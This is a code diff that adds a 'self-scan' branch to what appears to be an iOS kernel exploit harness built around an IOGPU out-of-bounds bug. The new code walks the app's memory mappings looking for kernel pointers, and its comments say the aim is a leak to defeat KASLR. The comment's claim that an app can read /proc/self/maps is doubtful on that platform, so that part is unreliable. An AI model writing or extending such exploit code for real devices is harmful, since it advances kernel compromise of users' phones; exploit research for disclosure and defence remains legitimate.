@@ -997,6 +997,54 @@ void nk_iogpu_group_oob_run(int trigger)
         }
     }
 
+
+    if (trigger == 9) {
+        /* SELF-SCAN: hunt a kernel pointer in OUR OWN heap.
+         *
+         * On 26.2 the kernel is not mapped into the user address space at
+         * all (the scan of 0xfffffff000000000..0xfffffff020000000 found
+         * nothing readable), and the KASLR detector needs a leak too. But
+         * the app's own heap holds IOKit objects - IOSurface, IOMemory-
+         * Descriptor, IOService - and those contain kernel pointers (the
+         * backing store, the task, the registry links). Scanning our own
+         * address space needs no vulnerability at all.
+         *
+         * We walk the heap via /proc/self/maps (readable by the app) and
+         * look for 8-byte values whose low 48 bits are a kernel address.
+         */
+        ol("[grp] === SELF-SCAN (kernel pointer in our own heap) ===");
+        FILE *f = fopen("/proc/self/maps", "r");
+        if (!f) { ol("[grp] no /proc/self/maps"); return; }
+        char line[512];
+        uint32_t regions = 0, hits = 0;
+        while (fgets(line, sizeof(line), f)) {
+            uint64_t lo = 0, hi = 0;
+            char perms[8] = {0};
+            if (sscanf(line, "%llx-%llx %7s", (unsigned long long *)&lo,
+                       (unsigned long long *)&hi, perms) != 3) continue;
+            if (perms[0] != 'r') continue;
+            if (hi - lo > 0x4000000ULL) continue;      /* skip the big mappings */
+            if (lo < 0x100000000ULL) continue;        /* skip the low heap   */
+            regions++;
+            for (uint64_t a = lo; a + 8 <= hi; a += 8) {
+                uint64_t v = 0;
+                memcpy(&v, (const void *)a, 8);
+                if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+                uint64_t low48 = v & 0x0000FFFFFFFFFFFFULL;
+                if (((low48 >> 32) & 0xFFFFULL) != 0xFFFFULL) continue;
+                if ((v & 0xFULL) != 0) continue;
+                if ((v & 0x7FF8000000000000ULL) == 0x7FF8000000000000ULL) continue;
+                hits++;
+                ol("[grp] HIT addr=0x%016llx -> 0x%016llx", (unsigned long long)a,
+                   (unsigned long long)v);
+                if (hits >= 24) break;
+            }
+            if (hits >= 24) break;
+        }
+        fclose(f);
+        ol("[grp] self-scan done: regions=%u hits=%u", regions, hits);
+    }
+
     if (trigger == 0 || trigger == 4) {
         /* DUPLICATE ADD = THE REMOVE PATH.
          *
